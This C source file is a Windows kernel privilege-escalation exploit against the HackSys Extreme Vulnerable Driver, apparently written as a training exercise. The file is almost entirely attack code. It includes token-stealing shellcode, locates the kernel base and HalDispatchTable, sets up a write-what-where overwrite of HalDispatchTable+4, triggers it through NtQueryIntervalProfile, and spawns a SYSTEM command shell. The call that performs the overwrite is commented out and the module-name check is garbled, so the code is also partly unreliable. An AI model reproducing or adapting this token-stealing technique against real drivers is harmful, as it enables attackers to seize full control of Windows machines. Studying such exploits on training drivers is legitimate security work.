
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>


#define IOCTL_OverWriteHALp4 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802,METHOD_NEITHER, FILE_ANY_ACCESS)

#define ModuleSize 0x100000

#define NT_SUCCESS 0x00000000



#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID         0x004  // SYSTEM Process NTSYSAPI 

typedef enum _SYSTEM_INFORMATION_CLASS {

	SystemBasicInformation,
	SystemProcessorInformation,
	SystemPerformanceInformation,
	SystemTimeOfDayInformation,
	SystemPathInformation,
	SystemProcessInformation,
	SystemCallCountInformation,
	SystemDeviceInformation,
	SystemProcessorPerformanceInformation,
	SystemFlagsInformation,
	SystemCallTimeInformation,
	SystemModuleInformation,
	SystemLocksInformation,
	SystemStackTraceInformation,
	SystemPagedPoolInformation,
	SystemNonPagedPoolInformation,
	SystemHandleInformation,
	SystemObjectInformation,
	SystemPageFileInformation,
	SystemVdmInstemulInformation,
	SystemVdmBopInformation,
	SystemFileCacheInformation,
	SystemPoolTagInformation,
	SystemInterruptInformation,
	SystemDpcBehaviorInformation,
	SystemFullMemoryInformation,
	SystemLoadGdiDriverInformation,
	SystemUnloadGdiDriverInformation,
	SystemTimeAdjustmentInformation,
	SystemSummaryMemoryInformation,
	SystemNextEventIdInformation,
	SystemEventIdsInformation,
	SystemCrashDumpInformation,
	SystemExceptionInformation,
	SystemCrashDumpStateInformation,
	SystemKernelDebuggerInformation,
	SystemContextSwitchInformation,
	SystemRegistryQuotaInformation,
	SystemExtendServiceTableInformation,
	SystemPrioritySeperation,
	SystemPlugPlayBusInformation,
	SystemDockInformation,
	SystemProcessorSpeedInformation,
	SystemCurrentTimeZoneInformation,
	SystemLookasideInformation
} SYSTEM_INFORMATION_CLASS, *PSYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	BYTE                 Name[256];
} SYSTEM_MODULE, *PSYSTEM_MODULE;

typedef struct _RTL_PROCESS_MODULES {
	ULONG NumberOfModules;
	SYSTEM_MODULE Modules[1];
} RTL_PROCESS_MODULES;

typedef NTSTATUS(NTAPI  * FNtQuerySystemInformation)(IN DWORD  SystemInformationClass, OUT PVOID SystemInformation, IN ULONG SystemInformationLength, OUT PULONG ReturnLength OPTIONAL);

typedef NTSYSAPI NTSTATUS(NTAPI *  FNtQueryIntervalProfile)(IN ULONG  ProfileSource, OUT PULONG  Interval);

typedef struct _WRITE_WHAT_WHERE {
	PULONG What;
	PULONG Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;


    //shellcode from hacksys team 
  VOID  TokenHijackingShellcode() {

	__asm {
		    int 0x3;
	     	pushad;

	    	xor eax, eax;

           mov eax, fs:[eax + KTHREAD_OFFSET]; Get nt!_KPCR.PcrbData.CurrentThread; _KTHREAD is located at FS : [0x124]

			mov eax, [eax + EPROCESS_OFFSET];  Get nt!_KTHREAD.ApcState.Process

			mov ecx, eax; Copy current process _EPROCESS structure

			mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM process PID = 0x4

		SearchSystemPID:
		    mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
			sub eax, FLINK_OFFSET
			cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
			jne SearchSystemPID

			mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token

			mov[ecx + TOKEN_OFFSET], edx; Replace target process nt!_EPROCESS.Token

			popad;
	}
}
 



int main(int argc, char * argv[])
{
	int n = 0 , i = 0 ;
	int KprofileSource = 0xDEAD , Interval = 0 ;
	NTSTATUS stat; 
	PVOID KernelBaseAddress = NULL; 
	PVOID HALDisptacher = NULL ;  // a pointer to hardware Abstration layer ..which in turn is going to hold a pointer HALdispatchTable + 4 
	PVOID OSkerneladdress = NULL; 
	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION pi;
	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	StartupInfo.cb = sizeof(StartupInfo);
	ZeroMemory(&pi, sizeof(pi));
    
	//allocate buffer for pointers of both shellcode and 'HaldispatchTable + 4' since in kernel land are stored in a structure 
	PWRITE_WHAT_WHERE pWWW = (WRITE_WHAT_WHERE * )VirtualAlloc(NULL,sizeof(WRITE_WHAT_WHERE),MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	if (pWWW == NULL)
	{
		fputs("Cannot Allocate enough memory \n",stderr);
		ExitProcess(-1);
	}
	//a function pointer to hold the routine of the Token stealing shellcode  
	VOID(*pfnshellcode)(VOID) = TokenHijackingShellcode; 
	
	// since the vulnerable driver assigns this pointer to an arbitrary value 
	pWWW->What = (PULONG)&pfnshellcode;
	
	FNtQuerySystemInformation MyNtQuerySystemInformation = (FNtQuerySystemInformation)GetProcAddress(LoadLibrary("ntdll.dll"), "NtQuerySystemInformation"); 

	FNtQueryIntervalProfile MyNtQueryIntervalProfile = (FNtQueryIntervalProfile)GetProcAddress(LoadLibrary("ntdll.dll"), "NtQueryIntervalProfile"); 
	
	RTL_PROCESS_MODULES  * ModulesInfo = (RTL_PROCESS_MODULES *)VirtualAlloc(NULL, ModuleSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	stat = MyNtQuerySystemInformation(SystemModuleInformation, ModulesInfo , ModuleSize , NULL);

	if (stat != NT_SUCCESS)
	{
		fputs("Error in NtQuerySystemInformation\n",stderr);
		ExitProcess(-1);
	}
	//find the kernel module base address (ntkrnlpa/ntoskrnl)
	for(i = 0; i < ModulesInfo->NumberOfModules; i++)
	{
		if (strncmp("ntoskrnl", (const char *)ModulesInfo->Modules[i].Name + ModulesInfo->Modules[i].NameOffset, 8) != 0 || !strncmp("ntkrnlpa", (const char *)ModulesInfo->Modules[i].Name + ModulesInfo->Modules[i].NameOffset, 8) != 0)
		{
			printf("* Kernel Image Name :  %s \n", ModulesInfo->Modules[i].Name + ModulesInfo->Modules[i].NameOffset);
			printf("* Kernel image Base :  0x%x \n" , ModulesInfo->Modules[i].ImageBaseAddress);
			KernelBaseAddress =(PVOID)(ModulesInfo->Modules[i].ImageBaseAddress); 
			break; 
		}
	}
	/*
	well in my system ,kernel image name is ntkrnlpa.exe 
	note that : this is supposed to be 'ModulesInfo->Modules[i].Name + ModulesInfo->Modules[i].NameOffset' 
	*/
	OSkerneladdress = (PVOID)LoadLibrary("ntkrnlpa.exe");
	
	printf("* Kernel image Base (from user-mode): 0x%x \n", OSkerneladdress);

	HALDisptacher = GetProcAddress(OSkerneladdress, "HalDispatchTable");
	printf("* HAldispatch Table :  0x%x \n", HALDisptacher);
	 //Get 
	HALDisptacher = (PVOID)((((DWORD)HALDisptacher - (DWORD)OSkerneladdress) + (DWORD)(ModulesInfo->Modules[i].ImageBaseAddress)) + 0x4);
	
	pWWW->Where = HALDisptacher;

	printf("* HALdispatch + 4 : 0x%x \n", HALDisptacher);

	//get a handle to the hacksys vulnerable driver !! 
	HANDLE VulnDriver = CreateFile("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (VulnDriver == INVALID_HANDLE_VALUE)
	{
		fputs("Error in getting a handle to the Driver  \n",stderr);
		ExitProcess(-1);
	}

	/*send an IOCTL to trigger the overwrite of an arbitrary value
     *(VOID *)(haldispatchtabel + 4 ) = (VOID * )&Pfnshellcode ;
	*/
//	DeviceIoControl(VulnDriver, IOCTL_OverWriteHALp4, (LPVOID)pWWW, sizeof(WRITE_WHAT_WHERE), NULL, 0, &n, NULL);

	/*
	nt!KeQueryIntervalProfile+0x15:
	82ae18a6 45              inc     ebp
	82ae18a7 f08d45fc        lock lea eax,[ebp-4]
	82ae18ab 50              push    eax
	82ae18ac 8d45f0          lea     eax,[ebp-10h]
	82ae18af 50              push    eax
	82ae18b0 6a0c            push    0Ch
	82ae18b2 6a01            push    1
	  
	=====> 82ae18b4 ff15bc239482    call    dword ptr [nt!HalDispatchTable+0x4 (829423bc)] <=======
	*/
	MyNtQueryIntervalProfile(KprofileSource ,&Interval);

	//Now we can spawn a cmd.exe with SYSTEM privilege 
	CreateProcess(NULL, "C:\\Windows\\system32\\cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &pi);

	WaitForSingleObject(pi.hProcess, INFINITE);
	VirtualFree(pWWW,sizeof(WRITE_WHAT_WHERE),0); 
	VirtualFree(ModulesInfo,sizeof(ModuleSize),0);

	return 0;
}
